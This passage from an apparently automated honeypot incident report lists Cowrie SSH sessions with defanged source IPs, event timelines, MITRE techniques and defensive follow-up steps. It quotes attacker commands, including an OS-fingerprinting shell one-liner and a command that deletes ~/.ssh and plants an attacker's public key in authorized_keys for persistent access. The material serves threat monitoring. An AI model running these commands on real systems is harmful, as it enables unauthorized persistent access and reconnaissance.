| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:01:41` | `cowrie.session.connect` |
| `2026-07-27 07:01:41` | `cowrie.client.version` |
| `2026-07-27 07:01:41` | `cowrie.client.kex` |
| `2026-07-27 07:01:41` | `cowrie.login.success` |
| `2026-07-27 07:01:42` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:01:42` | `cowrie.direct-tcpip.data` |
| `2026-07-27 07:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0500490c47dc

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-27 07:04 |
| **Last Seen** | 2026-07-27 07:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:04:10` | `cowrie.session.connect` |
| `2026-07-27 07:04:10` | `cowrie.client.version` |
| `2026-07-27 07:04:10` | `cowrie.client.kex` |
| `2026-07-27 07:04:13` | `cowrie.login.success` |
| `2026-07-27 07:04:13` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a1875e8116

| Field | Detail |
|---|---|
| **Source IP** | `60.175.91[.]53` |
| **First Seen** | 2026-07-27 07:04 |
| **Last Seen** | 2026-07-27 07:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:04:19` | `cowrie.session.connect` |
| `2026-07-27 07:04:20` | `cowrie.client.version` |
| `2026-07-27 07:04:20` | `cowrie.client.kex` |
| `2026-07-27 07:04:23` | `cowrie.login.success` |
| `2026-07-27 07:04:24` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.175.91[.]53` to AbuseIPDB if not already reported
- [ ] Block `60.175.91[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e10fff37fd95

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:04 |
| **Last Seen** | 2026-07-27 07:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:04:34` | `cowrie.session.connect` |
| `2026-07-27 07:04:35` | `cowrie.client.version` |
| `2026-07-27 07:04:35` | `cowrie.client.kex` |
| `2026-07-27 07:04:41` | `cowrie.login.success` |
| `2026-07-27 07:04:44` | `cowrie.session.params` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.success` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:44` | `cowrie.command.input` |
| `2026-07-27 07:04:46` | `cowrie.log.closed` |
| `2026-07-27 07:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fba9222b1a2

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-27 07:04 |
| **Last Seen** | 2026-07-27 07:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:04:42` | `cowrie.session.connect` |
| `2026-07-27 07:04:42` | `cowrie.client.version` |
| `2026-07-27 07:04:42` | `cowrie.client.kex` |
| `2026-07-27 07:04:43` | `cowrie.login.success` |
| `2026-07-27 07:04:43` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22f12238f499

| Field | Detail |
|---|---|
| **Source IP** | `93.62.72[.]229` |
| **First Seen** | 2026-07-27 07:07 |
| **Last Seen** | 2026-07-27 07:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:07:57` | `cowrie.session.connect` |
| `2026-07-27 07:07:57` | `cowrie.client.version` |
| `2026-07-27 07:07:57` | `cowrie.client.kex` |
| `2026-07-27 07:07:58` | `cowrie.login.success` |
| `2026-07-27 07:07:58` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.62.72[.]229` to AbuseIPDB if not already reported
- [ ] Block `93.62.72[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ada3a32df95

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-07-27 07:08 |
| **Last Seen** | 2026-07-27 07:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:08:08` | `cowrie.session.connect` |
| `2026-07-27 07:08:08` | `cowrie.client.version` |
| `2026-07-27 07:08:08` | `cowrie.client.kex` |
| `2026-07-27 07:08:10` | `cowrie.login.success` |
| `2026-07-27 07:08:11` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e789f0225ee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:10 |
| **Last Seen** | 2026-07-27 07:11 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:10:44` | `cowrie.session.connect` |
| `2026-07-27 07:10:47` | `cowrie.client.version` |
| `2026-07-27 07:10:47` | `cowrie.client.kex` |
| `2026-07-27 07:10:56` | `cowrie.login.success` |
| `2026-07-27 07:11:00` | `cowrie.session.params` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.success` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:01` | `cowrie.command.input` |
| `2026-07-27 07:11:02` | `cowrie.log.closed` |
| `2026-07-27 07:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300770507e08

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-27 07:11 |
| **Last Seen** | 2026-07-27 07:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:11:22` | `cowrie.session.connect` |
| `2026-07-27 07:11:23` | `cowrie.client.version` |
| `2026-07-27 07:11:23` | `cowrie.client.kex` |
| `2026-07-27 07:11:24` | `cowrie.login.success` |
| `2026-07-27 07:11:24` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc2b26fae76

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-27 07:11 |
| **Last Seen** | 2026-07-27 07:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:11:34` | `cowrie.session.connect` |
| `2026-07-27 07:11:35` | `cowrie.client.version` |
| `2026-07-27 07:11:35` | `cowrie.client.kex` |
| `2026-07-27 07:11:38` | `cowrie.login.success` |
| `2026-07-27 07:11:39` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d6ddc022cc2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:13 |
| **Last Seen** | 2026-07-27 07:13 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:13:22` | `cowrie.session.connect` |
| `2026-07-27 07:13:24` | `cowrie.client.version` |
| `2026-07-27 07:13:24` | `cowrie.client.kex` |
| `2026-07-27 07:13:38` | `cowrie.login.success` |
| `2026-07-27 07:13:41` | `cowrie.session.params` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.success` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:41` | `cowrie.command.input` |
| `2026-07-27 07:13:43` | `cowrie.log.closed` |
| `2026-07-27 07:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d3f56334ef

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:17 |
| **Last Seen** | 2026-07-27 07:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:17:41` | `cowrie.session.connect` |
| `2026-07-27 07:17:41` | `cowrie.client.version` |
| `2026-07-27 07:17:41` | `cowrie.client.kex` |
| `2026-07-27 07:17:46` | `cowrie.login.success` |
| `2026-07-27 07:17:49` | `cowrie.session.params` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.success` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:49` | `cowrie.command.input` |
| `2026-07-27 07:17:50` | `cowrie.log.closed` |
| `2026-07-27 07:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1262096c4e1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:20 |
| **Last Seen** | 2026-07-27 07:20 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:20:32` | `cowrie.session.connect` |
| `2026-07-27 07:20:36` | `cowrie.client.version` |
| `2026-07-27 07:20:36` | `cowrie.client.kex` |
| `2026-07-27 07:20:41` | `cowrie.login.success` |
| `2026-07-27 07:20:47` | `cowrie.session.params` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.success` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:47` | `cowrie.command.input` |
| `2026-07-27 07:20:48` | `cowrie.log.closed` |
| `2026-07-27 07:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f143fcb0c30

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-27 07:23 |
| **Last Seen** | 2026-07-27 07:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:23:33` | `cowrie.session.connect` |
| `2026-07-27 07:23:34` | `cowrie.client.version` |
| `2026-07-27 07:23:34` | `cowrie.client.kex` |
| `2026-07-27 07:23:40` | `cowrie.login.success` |
| `2026-07-27 07:23:44` | `cowrie.session.params` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.success` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:44` | `cowrie.command.input` |
| `2026-07-27 07:23:45` | `cowrie.log.closed` |
| `2026-07-27 07:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5eddded7627

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:17` | `cowrie.session.connect` |
| `2026-07-27 07:25:18` | `cowrie.client.version` |
| `2026-07-27 07:25:18` | `cowrie.client.kex` |
| `2026-07-27 07:25:19` | `cowrie.login.success` |
| `2026-07-27 07:25:20` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cfb42d4f098

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:25` | `cowrie.session.connect` |
| `2026-07-27 07:25:25` | `cowrie.client.version` |
| `2026-07-27 07:25:25` | `cowrie.client.kex` |
| `2026-07-27 07:25:26` | `cowrie.login.success` |
| `2026-07-27 07:25:27` | `cowrie.direct-tcpip.request` |
| `2026-07-27 07:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb8bb5ae4fd

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:33` | `cowrie.session.connect` |
| `2026-07-27 07:25:33` | `cowrie.client.version` |
| `2026-07-27 07:25:33` | `cowrie.client.kex` |
| `2026-07-27 07:25:34` | `cowrie.login.success` |
| `2026-07-27 07:25:35` | `cowrie.session.params` |
| `2026-07-27 07:25:35` | `cowrie.command.input` |
| `2026-07-27 07:25:35` | `cowrie.command.failed` |
| `2026-07-27 07:25:36` | `cowrie.log.closed` |
| `2026-07-27 07:25:37` | `cowrie.session.params` |
| `2026-07-27 07:25:37` | `cowrie.command.input` |
| `2026-07-27 07:25:37` | `cowrie.session.file_download` |
| `2026-07-27 07:25:37` | `cowrie.log.closed` |
| `2026-07-27 07:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0eb3939ec74

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
| **First Seen** | 2026-07-27 07:25 |
| **Last Seen** | 2026-07-27 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 07:25:37` | `cowrie.session.connect` |
| `2026-07-27 07:25:37` | `cowrie.client.version` |
| `2026-07-27 07:25:37` | `cowrie.client.kex` |
| `2026-07-27 07:25:38` | `cowrie.login.success` |
| `2026-07-27 07:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa6cf7311d9

| Field | Detail |
|---|---|
| **Source IP** | `139.255.254[.]163` |
